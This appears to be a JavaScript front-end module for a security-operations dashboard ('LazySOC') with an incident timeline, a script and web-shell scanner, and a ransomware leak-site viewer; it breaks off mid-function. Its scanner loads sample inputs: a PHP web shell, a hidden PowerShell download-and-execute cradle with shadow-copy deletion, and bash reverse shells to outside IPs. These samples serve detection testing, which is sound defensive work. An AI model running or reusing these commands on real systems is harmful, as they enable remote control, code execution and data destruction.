/**
 * LazySOC Enhanced Features Module:
 * - Sidebar dropdown accordions & keyboard shortcuts
 * - Case Timeline & Canvas
 * - Suspicious Script & Web Shell Scanner
 * - Darkweb & Ransomware Intelligence
 * - Watchlist Item-by-Item Manager
 * - Global Navigation, Search, & Modals
 */

// =========================================================================
// 1. SIDEBAR ACCORDION DROPDOWN TOGGLE
// =========================================================================
function toggleSidebarGroup(groupId) {
  const el = document.getElementById(groupId);
  const chevron = document.getElementById(`chevron-${groupId}`);
  if (!el) return;
  const isHidden = el.classList.toggle('hidden');
  if (chevron) {
    chevron.style.transform = isHidden ? 'rotate(-90deg)' : 'rotate(0deg)';
  }
}

// =========================================================================
// 2. GLOBAL SEARCH & KEYBOARD SHORTCUTS (Ctrl+K, Esc)
// =========================================================================
function handleGlobalSearch(e) {
  if (e.key !== 'Enter') return;
  const q = e.target.value.trim();
  if (!q) return;

  const lower = q.toLowerCase();
  if (lower.startsWith('cve-')) {
    switchTab('cve');
    const input = document.getElementById('cve-search-input');
    if (input) { input.value = q; if (typeof fetchCveIntel === 'function') fetchCveIntel(); }
  } else if (lower.includes('darkweb') || lower.includes('ransomware') || lower.includes('leak')) {
    switchTab('darkweb');
  } else if (lower.includes('case') || lower.includes('timeline')) {
    switchTab('casecanvas');
  } else if (lower.includes('script') || lower.includes('webshell') || lower.includes('payload')) {
    switchTab('scriptscan');
  } else if (lower.includes('recon') || lower.includes('whois')) {
    switchTab('recon');
  } else if (lower.includes('eml') || lower.includes('mail header') || lower.includes('phish')) {
    switchTab('eml');
  } else if (lower.includes('watchlist') || lower.includes('inventory')) {
    switchTab('watchlist');
  } else if (lower.includes('playbook')) {
    if (typeof openPlaybookModal === 'function') openPlaybookModal();
  } else {
    // Default to IoC Triage
    switchTab('triage');
    const rawInput = document.getElementById('raw-input');
    if (rawInput) {
      rawInput.value = q;
      if (typeof runScan === 'function') runScan();
    }
  }
}

document.addEventListener('keydown', (e) => {
  // Ctrl+K for search palette focus
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
    e.preventDefault();
    const searchInput = document.getElementById('global-search-input');
    if (searchInput) searchInput.focus();
  }
  // Esc to close all open modals
  if (e.key === 'Escape') {
    closeDocsModal();
    closeSystemHealthModal();
    closeAddWatchlistModal();
    if (typeof closePlaybookModal === 'function') closePlaybookModal();
  }
});

// =========================================================================
// 3. DOCUMENTATION & SYSTEM HEALTH MODALS
// =========================================================================
function openDocsModal() {
  document.getElementById('modal-docs')?.classList.remove('hidden');
  if (window.lucide) window.lucide.createIcons();
}
function closeDocsModal() {
  document.getElementById('modal-docs')?.classList.add('hidden');
}
function openSystemHealthModal() {
  document.getElementById('modal-health')?.classList.remove('hidden');
  if (window.lucide) window.lucide.createIcons();
}
function closeSystemHealthModal() {
  document.getElementById('modal-health')?.classList.add('hidden');
}

// =========================================================================
// 4. INCIDENT CASE CANVAS & EVIDENCE TIMELINE
// =========================================================================
let caseEvents = [];
let caseEvidence = [];

function initCaseCanvas() {
  if (caseEvents.length === 0) {
    loadSampleCaseData();
  } else {
    renderCaseTimeline();
    renderCaseEvidence();
  }
}

function setEventTimeToNow() {
  const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
  const input = document.getElementById('event-time');
  if (input) input.value = now;
}

function addTimelineEvent() {
  const timeInput = document.getElementById('event-time');
  const time = (timeInput && timeInput.value.trim()) || new Date().toISOString().replace('T', ' ').substring(0, 19);
  const source = document.getElementById('event-source')?.value || 'Security Alert';
  const severity = document.getElementById('event-severity')?.value || 'HIGH';
  const actor = document.getElementById('event-actor')?.value.trim() || 'N/A';
  const mitre = document.getElementById('event-mitre')?.value.trim() || 'T1059';
  const descEl = document.getElementById('event-desc');
  const desc = descEl ? descEl.value.trim() : '';

  if (!desc) {
    alert('Please provide a brief technical description for the event.');
    return;
  }

  caseEvents.push({
    id: Date.now(),
    time,
    source,
    severity,
    actor,
    mitre,
    desc
  });

  if (descEl) descEl.value = '';
  const actorEl = document.getElementById('event-actor');
  if (actorEl) actorEl.value = '';
  const mitreEl = document.getElementById('event-mitre');
  if (mitreEl) mitreEl.value = '';

  renderCaseTimeline();
}

function deleteTimelineEvent(id) {
  caseEvents = caseEvents.filter(e => e.id !== id);
  renderCaseTimeline();
}

function renderCaseTimeline() {
  const container = document.getElementById('case-timeline-container');
  const countEl = document.getElementById('timeline-count');
  if (!container) return;

  if (countEl) countEl.innerText = caseEvents.length;

  if (caseEvents.length === 0) {
    container.innerHTML = `<div class="p-4 text-center text-slate-500 text-xs">No timeline events recorded yet. Add an event above or click "Load Sample Incident".</div>`;
    return;
  }

  const sevColors = {
    CRITICAL: 'bg-red-500 text-red-400 border-red-500/40',
    HIGH: 'bg-amber-500 text-amber-400 border-amber-500/40',
    MEDIUM: 'bg-blue-500 text-blue-400 border-blue-500/40',
    LOW: 'bg-emerald-500 text-emerald-400 border-emerald-500/40',
    INFO: 'bg-slate-500 text-slate-400 border-slate-500/40',
  };

  container.innerHTML = caseEvents.map(evt => {
    const color = sevColors[evt.severity] || sevColors.INFO;
    return `
      <div class="relative pl-6 space-y-1.5 group">
        <div class="absolute left-[-1px] top-1.5 w-3 h-3 rounded-full border-2 border-cyber-card ${color.split(' ')[0]} ring-2 ring-cyber-border"></div>
        <div class="p-3.5 rounded-xl bg-[#090d16] border border-cyber-border hover:border-cyber-border-hover transition space-y-2">
          <div class="flex items-center justify-between flex-wrap gap-2">
            <div class="flex items-center gap-2">
              <span class="text-xs font-bold text-white">${escapeHtml(evt.time)}</span>
              <span class="px-2 py-0.5 rounded text-[10px] font-bold border ${color}">${evt.severity}</span>
              <span class="px-2 py-0.5 rounded text-[10px] bg-white/5 border border-cyber-border text-slate-300">${escapeHtml(evt.source)}</span>
            </div>
            <div class="flex items-center gap-2">
              <span class="px-1.5 py-0.5 rounded bg-amber-500/10 text-amber-300 border border-amber-500/30 text-[10px]">${escapeHtml(evt.mitre)}</span>
              <button onclick="deleteTimelineEvent(${evt.id})" class="opacity-0 group-hover:opacity-100 text-slate-500 hover:text-red-400 transition" title="Delete event">
                <i data-lucide="trash" class="w-3.5 h-3.5"></i>
              </button>
            </div>
          </div>
          <p class="text-xs text-slate-200">${escapeHtml(evt.desc)}</p>
          ${evt.actor !== 'N/A' ? `<div class="text-[11px] text-slate-400 font-mono"><span class="text-slate-500">Host / IP Target:</span> <span class="text-cyber-cyan">${escapeHtml(evt.actor)}</span></div>` : ''}
        </div>
      </div>
    `;
  }).join('');

  if (window.lucide) window.lucide.createIcons();
}

function openAddEvidencePrompt() {
  const val = prompt('Enter Indicator (IP, Hash, Domain, or URL) to pin as evidence:');
  if (!val || !val.trim()) return;
  const note = prompt('Optional Forensic Note for this indicator:') || 'Extracted during triage';
  caseEvidence.push({
    value: val.trim(),
    note: note.trim(),
    timestamp: new Date().toISOString().substring(11, 19)
  });
  renderCaseEvidence();
}

function deleteEvidenceItem(idx) {
  caseEvidence.splice(idx, 1);
  renderCaseEvidence();
}

function renderCaseEvidence() {
  const list = document.getElementById('case-evidence-list');
  if (!list) return;

  if (caseEvidence.length === 0) {
    list.innerHTML = `<div class="text-slate-500 text-xs text-center py-4">No indicators pinned yet. Click "+ Pin IoC".</div>`;
    return;
  }

  list.innerHTML = caseEvidence.map((ev, idx) => `
    <div class="p-2.5 rounded-lg bg-[#070b14] border border-cyber-border flex items-center justify-between gap-2 group">
      <div class="min-w-0">
        <div class="text-xs font-bold text-white truncate flex items-center gap-1.5">
          <span class="w-1.5 h-1.5 rounded-full bg-cyber-cyan"></span>
          ${escapeHtml(ev.value)}
        </div>
        <div class="text-[10px] text-slate-400 truncate">${escapeHtml(ev.note)}</div>
      </div>
      <div class="flex items-center gap-1.5 flex-shrink-0">
        <button onclick="pivotDarkwebIocToTriage('${escapeHtml(ev.value)}')" class="px-2 py-0.5 rounded bg-cyber-cyan/15 text-cyber-cyan border border-cyber-cyan/30 text-[10px] font-bold hover:bg-cyber-cyan/25">Triage</button>
        <button onclick="deleteEvidenceItem(${idx})" class="text-slate-500 hover:text-red-400 p-1"><i data-lucide="x" class="w-3.5 h-3.5"></i></button>
      </div>
    </div>
  `).join('');

  if (window.lucide) window.lucide.createIcons();
}

function loadSampleCaseData() {
  caseEvents = [
    {
      id: 1,
      time: "2026-11-04 14:15:22",
      source: "Email Security (SEG)",
      severity: "HIGH",
      actor: "finance-dept@external-payroll-audit.com",
      mitre: "T1566.001 (Spearphishing Attachment)",
      desc: "Targeted spearphishing email delivered to Finance Manager with password-protected ZIP archive 'Q3_Invoice_Audit.zip'."
    },
    {
      id: 2,
      time: "2026-11-04 14:22:05",
      source: "EDR / Host Alert",
      severity: "CRITICAL",
      actor: "WS-FIN-04 (10.14.2.88)",
      mitre: "T1059.001 (PowerShell Execution)",
      desc: "User extracted macro-enabled document. Suspicious hidden PowerShell process spawned executing DownloadString cradle."
    },
    {
      id: 3,
      time: "2026-11-04 14:24:18",
      source: "Firewall / Gateway",
      severity: "CRITICAL",
      actor: "194.38.20.12 (Port 8443)",
      mitre: "T1071.001 (C2 Beaconing via HTTPS)",
      desc: "High-frequency outbound HTTPS beaconing detected to known malicious bulletproof VPS C2 IP (194.38.20.12)."
    },
    {
      id: 4,
      time: "2026-11-04 14:35:00",
      source: "SOC Incident Handler",
      severity: "MEDIUM",
      actor: "WS-FIN-04",
      mitre: "T1078 (Account Isolation)",
      desc: "Immediate Host Isolation applied via EDR agent. Host firewall blocked from east-west lateral movement. Password revoked."
    }
  ];

  caseEvidence = [
    { value: "194.38.20.12", note: "Cobalt Strike C2 Beacon Destination", timestamp: "14:24:18" },
    { value: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", note: "Dropped Stager EXE Hash", timestamp: "14:22:05" },
    { value: "payroll-portal-auth365.com", note: "Phishing Redirect Domain", timestamp: "14:15:22" }
  ];

  const notesEl = document.getElementById('case-notes');
  if (notesEl) {
    notesEl.value = "1. WS-FIN-04 isolated from network perimeter.\n2. Memory dump extracted for volatile forensic analysis.\n3. Firewall block rule LAZYSOC_INC9042 pushed to edge Palo Alto gateways.\n4. User credentials reset across Active Directory and Azure AD.";
  }

  renderCaseTimeline();
  renderCaseEvidence();
}

function clearCaseData() {
  if (confirm('Are you sure you want to reset this incident case workspace?')) {
    caseEvents = [];
    caseEvidence = [];
    const notesEl = document.getElementById('case-notes');
    if (notesEl) notesEl.value = '';
    renderCaseTimeline();
    renderCaseEvidence();
  }
}

function updateCaseHeaderBadges() {
  const sevEl = document.getElementById('case-severity');
  const statEl = document.getElementById('case-status');
  const sevBadge = document.getElementById('case-severity-badge');
  const statBadge = document.getElementById('case-status-badge');

  const sev = sevEl ? sevEl.value : 'HIGH';
  const stat = statEl ? statEl.value : 'INVESTIGATING';

  if (sevBadge) {
    sevBadge.innerText = `${sev} SEVERITY`;
    sevBadge.className = `px-2 py-0.5 rounded border text-xs font-mono font-bold ${sev === 'CRITICAL' ? 'border-red-500/40 bg-red-500/10 text-red-400' : (sev === 'HIGH' ? 'border-amber-500/40 bg-amber-500/10 text-amber-400' : 'border-blue-500/40 bg-blue-500/10 text-blue-400')}`;
  }
  if (statBadge) {
    statBadge.innerText = `STATUS: ${stat}`;
  }
}

function exportCaseReport() {
  const caseId = document.getElementById('case-id')?.value || 'INC-SOC-001';
  const title = document.getElementById('case-title')?.value || 'Security Incident Investigation';
  const lead = document.getElementById('case-lead')?.value || 'SOC Analyst';
  const sev = document.getElementById('case-severity')?.value || 'HIGH';
  const status = document.getElementById('case-status')?.value || 'INVESTIGATING';
  const notes = document.getElementById('case-notes')?.value || '';

  let md = `# [LAZYSOC] INCIDENT HANDOVER REPORT: ${caseId}\n\n`;
  md += `**Incident Title:** ${title}\n`;
  md += `**Severity:** ${sev} | **Status:** ${status}\n`;
  md += `**Lead Investigator:** ${lead}\n`;
  md += `**Report Generated:** ${new Date().toISOString()}\n\n`;
  md += `---\n\n`;
  md += `## 🕒 Chronological Incident Attack Timeline\n\n`;

  caseEvents.forEach((ev, i) => {
    md += `### ${i+1}. [${ev.time} UTC] - ${ev.source} (${ev.severity})\n`;
    md += `- **Target / Host:** \`${ev.actor}\`\n`;
    md += `- **MITRE Technique:** \`${ev.mitre}\`\n`;
    md += `- **Description:** ${ev.desc}\n\n`;
  });

  md += `## 🛡️ Forensic Indicators & Evidence (IoCs)\n\n`;
  caseEvidence.forEach(ev => {
    md += `- \`${ev.value}\` - *${ev.note}*\n`;
  });

  md += `\n## 📝 Containment Actions & Next Steps\n\n`;
  md += `${notes || 'No notes documented.'}\n`;

  navigator.clipboard.writeText(md).then(() => {
    alert('SOC Incident Handover Note copied to clipboard in Markdown format!');
  }).catch(() => {
    const blob = new Blob([md], { type: 'text/markdown' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `${caseId}_handover_note.md`;
    a.click();
  });
}

// =========================================================================
// 5. SUSPICIOUS SCRIPT & WEBSHELL SCANNER
// =========================================================================
function loadSampleScript(type) {
  const input = document.getElementById('script-input');
  if (!input) return;
  if (type === 'php_eval') {
    input.value = `<?php\n// Obfuscated China Chopper / WSO Web Shell Variant\n$pass = "c99shell";\nif(isset($_POST["cmd"])) {\n    eval(gzinflate(base64_decode($_POST["cmd"])));\n}\nif(isset($_REQUEST["exec"])) {\n    system($_REQUEST["exec"]);\n}\n?>`;
  } else if (type === 'ps_cradle') {
    input.value = `powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadString('http://194.38.20.12:8080/payload.ps1') | IEX"; vssadmin delete shadows /all /quiet;`;
  } else if (type === 'bash_rev') {
    input.value = `#!/bin/bash\n# Reverse Shell One-Liner\nbash -i >& /dev/tcp/194.38.20.12/4444 0>&1\nmkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 45.142.214.89 8080 >/tmp/f;`;
  }
  runScriptScan();
}

async function runScriptScan() {
  const inputEl = document.getElementById('script-input');
  const payload = inputEl ? inputEl.value.trim() : '';
  const resultsDiv = document.getElementById('script-scan-results');
  if (!payload) {
    alert('Please paste script payload to inspect.');
    return;
  }
  if (!resultsDiv) return;

  resultsDiv.classList.remove('hidden');
  resultsDiv.innerHTML = `<div class="p-8 text-center text-slate-400 bg-cyber-card border border-cyber-border rounded-2xl"><div class="w-6 h-6 border-2 border-red-400 border-t-transparent rounded-full animate-spin mx-auto mb-2"></div>Scanning script signatures, webshell families, and extraction routines...</div>`;

  try {
    const resp = await fetch('/api/investigate/script-scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ payload })
    });
    const data = await resp.json();

    const sevColors = {
      CRITICAL: 'bg-red-500/20 text-red-400 border-red-500/40',
      HIGH: 'bg-amber-500/20 text-amber-400 border-amber-500/40',
      MEDIUM: 'bg-blue-500/20 text-blue-400 border-blue-500/40',
      CLEAN: 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40',
      INFO: 'bg-slate-500/20 text-slate-400 border-slate-500/40'
    };

    const badgeClass = sevColors[data.threat_level] || sevColors.INFO;

    let findingsHtml = '';
    if (data.findings && data.findings.length > 0) {
      findingsHtml = `
        <div class="rounded-xl border border-cyber-border bg-[#070b14] overflow-hidden">
          <div class="p-3 border-b border-cyber-border text-xs font-bold text-white flex items-center justify-between">
            <span>Triggered Threat Signatures (${data.findings.length})</span>
            <span class="text-[10px] text-slate-400">Heuristic & Pattern Detection</span>
          </div>
          <div class="divide-y divide-cyber-border">
            ${data.findings.map(f => `
              <div class="p-3 space-y-1.5 text-xs">
                <div class="flex items-center justify-between flex-wrap gap-2">
                  <div class="flex items-center gap-2">
                    <span class="px-2 py-0.5 rounded text-[10px] font-bold border ${sevColors[f.severity] || sevColors.INFO}">${f.severity}</span>
                    <span class="font-bold text-white">${escapeHtml(f.description)}</span>
                  </div>
                  <span class="px-2 py-0.5 rounded bg-amber-500/10 text-amber-300 border border-amber-500/30 text-[10px] font-bold">${escapeHtml(f.mitre_ttp)}</span>
                </div>
                <div class="text-[11px] text-slate-400 bg-black/40 p-2 rounded border border-cyber-border font-mono overflow-x-auto">
                  Snippet: <code class="text-cyber-cyan">${escapeHtml(f.matched_snippet)}</code>
                </div>
              </div>
            `).join('')}
          </div>
        </div>
      `;
    }

    let iocsHtml = '';
    if (data.extracted_iocs && data.extracted_iocs.length > 0) {
      iocsHtml = `
        <div class="rounded-xl border border-cyber-border bg-[#070b14] p-3 space-y-2">
          <div class="text-xs font-bold text-white flex items-center gap-1.5">
            <i data-lucide="target" class="w-3.5 h-3.5 text-cyber-cyan"></i> Extracted Embedded Indicators (${data.extracted_iocs.length})
          </div>
          <div class="flex flex-wrap gap-2">
            ${data.extracted_iocs.map(ioc => `
              <div class="px-2.5 py-1 rounded-lg bg-cyber-card border border-cyber-border text-xs flex items-center gap-2">
                <span class="text-slate-400 text-[10px] uppercase font-bold">${ioc.type}</span>
                <span class="text-white font-mono">${escapeHtml(ioc.value)}</span>
                <button onclick="pivotDarkwebIocToTriage('${escapeHtml(ioc.value)}')" class="px-1.5 py-0.5 rounded bg-cyber-cyan/15 text-cyber-cyan hover:bg-cyber-cyan/30 text-[10px] font-bold">Triage</button>
              </div>
            `).join('')}
          </div>
        </div>
      `;
    }

    let recoHtml = '';
    if (data.recommendations && data.recommendations.length > 0) {
      recoHtml = `
        <div class="p-3.5 rounded-xl border border-amber-500/30 bg-amber-500/5 space-y-1.5 text-xs">
          <div class="text-amber-300 font-bold flex items-center gap-1.5"><i data-lucide="alert-triangle" class="w-4 h-4"></i> Prescribed Containment Actions</div>
          <ul class="list-disc list-inside space-y-1 text-slate-300 text-[11px]">
            ${data.recommendations.map(r => `<li>${escapeHtml(r)}</li>`).join('')}
          </ul>
        </div>
      `;
    }

    resultsDiv.innerHTML = `
      <div class="rounded-2xl border border-cyber-border bg-cyber-card p-5 space-y-4">
        <div class="flex items-center justify-between border-b border-cyber-border/60 pb-3">
          <div class="flex items-center gap-3">
            <span class="text-base font-bold text-white">Detection Verdict:</span>
            <span class="px-3 py-1 rounded-xl font-bold border text-xs ${badgeClass}">${data.verdict} // ${data.threat_level}</span>
          </div>
          <div class="flex items-center gap-3 text-xs">
            <span>Threat Score: <strong class="text-white">${data.threat_score} / 100</strong></span>
            <span>Lines Scanned: <strong class="text-white">${data.script_lines}</strong></span>
          </div>
        </div>
        ${findingsHtml}
        ${iocsHtml}
        ${recoHtml}
      </div>
    `;

    if (window.lucide) window.lucide.createIcons();
  } catch (err) {
    resultsDiv.innerHTML = `<div class="p-4 rounded-xl border border-red-500/40 bg-red-500/10 text-red-400 text-xs">Scan failed: ${escapeHtml(err.message)}</div>`;
  }
}

// =========================================================================
// 6. DARKWEB & RANSOMWARE INTELLIGENCE
// =========================================================================
let darkwebData = {
  overview: null,
  victims: [],
  groups: [],
  iocs: [],
  page: 1,
  pageSize: 20,
  total: 0,
  totalPages: 1,
  query: ''
};

let darkwebSearchDebounce = null;

async function fetchDarkwebData(force = false) {
  if (darkwebData.overview && !force) return;

  try {
    const [ovResp, vicResp, grpResp, iocResp] = await Promise.all([
      fetch('/api/darkweb/overview').then(r => r.json()),
      fetch(`/api/darkweb/victims?page=1&limit=${darkwebData.pageSize}`).then(r => r.json()),
      fetch('/api/darkweb/groups').then(r => r.json()),
      fetch('/api/darkweb/iocs').then(r => r.json())
    ]);

    darkwebData.overview = ovResp;
    darkwebData.victims = vicResp.victims || [];
    darkwebData.total = vicResp.total || (vicResp.victims ? vicResp.victims.length : 0);
    darkwebData.totalPages = vicResp.total_pages || Math.max(1, Math.ceil(darkwebData.total / darkwebData.pageSize));
    darkwebData.page = vicResp.page || 1;
    darkwebData.groups = grpResp.groups || [];
    darkwebData.iocs = iocResp.iocs || [];

    const grpEl = document.getElementById('dw-stat-groups');
    if (grpEl) grpEl.innerText = `${darkwebData.overview.total_active_groups} Groups`;
    const vicEl = document.getElementById('dw-stat-victims');
    if (vicEl) vicEl.innerText = `${(darkwebData.total || darkwebData.overview.recent_victims_tracked || 0).toLocaleString()} Claims`;
    const secEl = document.getElementById('dw-stat-sector');
    if (secEl) secEl.innerText = darkwebData.overview.top_sector;

    renderDarkwebVictims();
    renderDarkwebPagination();
    renderDarkwebGroups();
    renderDarkwebIocs();
  } catch (e) {
    console.error('Failed to load darkweb data:', e);
  }
}

async function loadDarkwebVictimsPage() {
  const container = document.getElementById('dw-victims-list');
  if (container) {
    container.innerHTML = `
      <div class="col-span-full py-12 text-center text-red-400 font-mono text-xs space-y-2">
        <div class="w-6 h-6 border-2 border-red-500 border-t-transparent rounded-full animate-spin mx-auto"></div>
        <div>Querying Tor cartel disclosure archive...</div>
      </div>
    `;
  }

  try {
    const qParam = darkwebData.query ? `&q=${encodeURIComponent(darkwebData.query)}` : '';
    const url = `/api/darkweb/victims?page=${darkwebData.page}&limit=${darkwebData.pageSize}${qParam}`;
    const resp = await fetch(url);
    const data = await resp.json();

    darkwebData.victims = data.victims || [];
    darkwebData.total = data.total || 0;
    darkwebData.totalPages = data.total_pages || Math.max(1, Math.ceil(darkwebData.total / darkwebData.pageSize));
    darkwebData.page = data.page || 1;

    renderDarkwebVictims();
    renderDarkwebPagination();
  } catch (err) {
    console.error('Failed to load darkweb page:', err);
    if (container) {
      container.innerHTML = `<div class="col-span-full py-8 text-center text-red-400 font-mono text-xs">Failed to load darkweb disclosures. Please check connection.</div>`;
    }
  }
}

function handleDarkwebSearchInput() {
  clearTimeout(darkwebSearchDebounce);
  darkwebSearchDebounce = setTimeout(async () => {
    const q = (document.getElementById('dw-victim-search')?.value || '').trim();
    darkwebData.query = q;
    darkwebData.page = 1;
    await loadDarkwebVictimsPage();
  }, 250);
}

function filterDarkwebVictims() {
  handleDarkwebSearchInput();
}

async function changeDarkwebPage(newPage) {
  if (newPage < 1 || (darkwebData.totalPages && newPage > darkwebData.totalPages) || newPage === darkwebData.page) return;
  darkwebData.page = newPage;
  await loadDarkwebVictimsPage();
}

async function changeDarkwebPageSize(newSize) {
  darkwebData.pageSize = parseInt(newSize, 10) || 20;
  darkwebData.page = 1;
  await loadDarkwebVictimsPage();
}

async function jumpToDarkwebPage(val) {
  const p = parseInt(val, 10);
  if (!isNaN(p) && p >= 1 && p <= darkwebData.totalPages) {
    darkwebData.page = p;
    await loadDarkwebVictimsPage();
  }
}

function renderDarkwebPagination() {
  const paginationEl = document.getElementById('dw-pagination');
  const controls = document.getElementById('dw-pagination-controls');
  const rangeStart = document.getElementById('dw-range-start');
  const rangeEnd = document.getElementById('dw-range-end');
  const totalCount = document.getElementById('dw-total-count');
  const topCount = document.getElementById('dw-victim-count');
  const searchTag = document.getElementById('dw-search-tag');
  const jumpInput = document.getElementById('dw-jump-page');

  if (!paginationEl) return;

  const total = darkwebData.total || 0;
  const page = darkwebData.page || 1;
  const pageSize = darkwebData.pageSize || 20;
  const totalPages = Math.max(1, darkwebData.totalPages || Math.ceil(total / pageSize));

  if (topCount) topCount.innerText = total.toLocaleString();
  if (totalCount) totalCount.innerText = total.toLocaleString();

  if (jumpInput) {
    jumpInput.max = totalPages;
    jumpInput.value = page;
  }

  if (searchTag) {
    if (darkwebData.query) {
      searchTag.innerText = `Filtered: "${darkwebData.query}"`;
      searchTag.classList.remove('hidden');
    } else {
      searchTag.classList.add('hidden');
    }
  }

  if (total === 0) {
    if (rangeStart) rangeStart.innerText = '0';
    if (rangeEnd) rangeEnd.innerText = '0';
    if (controls) controls.innerHTML = '<span class="text-xs text-slate-500 font-mono">No pages</span>';
    return;
  }

  const startIdx = (page - 1) * pageSize + 1;
  const endIdx = Math.min(page * pageSize, total);
  if (rangeStart) rangeStart.innerText = startIdx.toLocaleString();
  if (rangeEnd) rangeEnd.innerText = endIdx.toLocaleString();

  if (!controls) return;

  let btns = '';

  // First page (<<) button
  btns += `
    <button onclick="changeDarkwebPage(1)" ${page === 1 ? 'disabled class="px-2 py-1 rounded bg-[#090d16] text-slate-600 border border-cyber-border cursor-not-allowed text-xs font-mono"' : 'class="px-2 py-1 rounded bg-[#090d16] hover:bg-white/10 text-slate-300 border border-cyber-border text-xs font-mono transition" title="First Page"'}>
      &laquo;
    </button>
  `;

  // Previous (< Prev) button
  btns += `
    <button onclick="changeDarkwebPage(${page - 1})" ${page === 1 ? 'disabled class="px-2.5 py-1 rounded bg-[#090d16] text-slate-600 border border-cyber-border cursor-not-allowed text-xs font-mono"' : 'class="px-2.5 py-1 rounded bg-[#090d16] hover:bg-white/10 text-slate-300 border border-cyber-border text-xs font-mono transition"'}>
      Prev
    </button>
  `;

  // Windowed Page Buttons
  let startP = Math.max(1, page - 2);
  let endP = Math.min(totalPages, startP + 4);
  if (endP - startP < 4) {
    startP = Math.max(1, endP - 4);
  }

  if (startP > 1) {
    btns += `<button onclick="changeDarkwebPage(1)" class="px-2.5 py-1 rounded bg-[#090d16] hover:bg-white/10 text-slate-300 border border-cyber-border text-xs font-mono">1</button>`;
    if (startP > 2) btns += `<span class="text-slate-600 text-xs px-1">...</span>`;
  }

  for (let p = startP; p <= endP; p++) {
    if (p === page) {
      btns += `<button class="px-2.5 py-1 rounded bg-red-500/20 text-red-400 border border-red-500/40 font-bold text-xs font-mono shadow-sm shadow-red-500/20">${p}</button>`;
    } else {
      btns += `<button onclick="changeDarkwebPage(${p})" class="px-2.5 py-1 rounded bg-[#090d16] hover:bg-white/10 text-slate-300 border border-cyber-border text-xs font-mono transition">${p}</button>`;
    }
  }

  if (endP < totalPages) {
    if (endP < totalPages - 1) btns += `<span class="text-slate-600 text-xs px-1">...</span>`;
    btns += `<button onclick="changeDarkwebPage(${totalPages})" class="px-2.5 py-1 rounded bg-[#090d16] hover:bg-white/10 text-slate-300 border border-cyber-border text-xs font-mono">${totalPages}</button>`;
  }

  // Next (Next >) button
  btns += `
    <button onclick="changeDarkwebPage(${page + 1})" ${page === totalPages ? 'disabled class="px-2.5 py-1 rounded bg-[#090d16] text-slate-600 border border-cyber-border cursor-not-allowed text-xs font-mono"' : 'class="px-2.5 py-1 rounded bg-[#090d16] hover:bg-white/10 text-slate-300 border border-cyber-border text-xs font-mono transition"'}>
      Next
    </button>
  `;

  // Last (>>) button
  btns += `
    <button onclick="changeDarkwebPage(${totalPages})" ${page === totalPages ? 'disabled class="px-2 py-1 rounded bg-[#090d16] text-slate-600 border border-cyber-border cursor-not-allowed text-xs font-mono"' : 'class="px-2 py-1 rounded bg-[#090d16] hover:bg-white/10 text-slate-300 border border-cyber-border text-xs font-mono transition" title="Last Page"'}>
      &raquo;
    </button>
  `;

  controls.innerHTML = btns;
}

function switchDarkwebSubTab(subTab) {
  ['victims', 'groups', 'iocs', 'domain-intel'].forEach(t => {
    const panel = document.getElementById(`dw-panel-${t}`);
    const btn = document.getElementById(`dw-tab-${t}`);
    if (panel) panel.classList.add('hidden');
    if (btn) {
      btn.classList.remove('border-red-400', 'text-white');
      btn.classList.add('border-transparent', 'text-slate-400');
    }
  });

  const activePanel = document.getElementById(`dw-panel-${subTab}`);
  const activeBtn = document.getElementById(`dw-tab-${subTab}`);
  if (activePanel) activePanel.classList.remove('hidden');
  if (activeBtn) {
    activeBtn.classList.add('border-red-400', 'text-white');
    activeBtn.classList.remove('border-transparent', 'text-slate-400');
  }
  if (window.lucide) window.lucide.createIcons();
}

function renderDarkwebVictims() {
  const container = document.getElementById('dw-victims-list');
  const countEl = document.getElementById('dw-victim-count');
  if (!container) return;

  if (countEl) countEl.innerText = darkwebData.victims.length;

  container.innerHTML = darkwebData.victims.map(v => `
    <div class="rounded-xl border border-cyber-border bg-cyber-card p-4 space-y-2 hover:border-red-500/40 transition">
      <div class="flex items-center justify-between gap-2 border-b border-cyber-border/60 pb-2">
        <span class="px-2 py-0.5 rounded text-[10px] font-bold bg-red-500/15 text-red-400 border border-red-500/30 uppercase">${escapeHtml(v.group_name)}</span>
        <span class="text-[10px] text-slate-500">${escapeHtml(v.published || 'Recent')}</span>
      </div>
      <div class="space-y-1">
        <h4 class="text-sm font-bold text-white hover:text-red-400 transition cursor-pointer">${escapeHtml(v.post_title)}</h4>
        <div class="flex items-center gap-3 text-[11px] text-slate-400">
          <span>Sector: <strong class="text-slate-300">${escapeHtml(v.activity)}</strong></span>
          <span>Country: <strong class="text-cyber-cyan">${escapeHtml(v.country)}</strong></span>
        </div>
        <p class="text-xs text-slate-300 line-clamp-2">${escapeHtml(v.description)}</p>
      </div>
      ${v.post_url ? `
        <div class="pt-1 border-t border-cyber-border/40 text-[10px] font-mono text-slate-500 truncate flex items-center gap-1.5">
          <i data-lucide="shield" class="w-3 h-3 text-red-400 flex-shrink-0"></i>
          <span class="text-slate-400 truncate">Tor Leak Mirror: ${escapeHtml(v.post_url)}</span>
        </div>
      ` : ''}
    </div>
  `).join('');

  if (window.lucide) window.lucide.createIcons();
}

function filterDarkwebVictims() {
  const q = (document.getElementById('dw-victim-search')?.value || '').toLowerCase().trim();
  const container = document.getElementById('dw-victims-list');
  if (!container) return;

  const filtered = darkwebData.victims.filter(v => 
    (v.post_title || '').toLowerCase().includes(q) ||
    (v.group_name || '').toLowerCase().includes(q) ||
    (v.activity || '').toLowerCase().includes(q) ||
    (v.country || '').toLowerCase().includes(q)
  );

  const countEl = document.getElementById('dw-victim-count');
  if (countEl) countEl.innerText = filtered.length;

  container.innerHTML = filtered.map(v => `
    <div class="rounded-xl border border-cyber-border bg-cyber-card p-4 space-y-2 hover:border-red-500/40 transition">
      <div class="flex items-center justify-between gap-2 border-b border-cyber-border/60 pb-2">
        <span class="px-2 py-0.5 rounded text-[10px] font-bold bg-red-500/15 text-red-400 border border-red-500/30 uppercase">${escapeHtml(v.group_name)}</span>
        <span class="text-[10px] text-slate-500">${escapeHtml(v.published || 'Recent')}</span>
      </div>
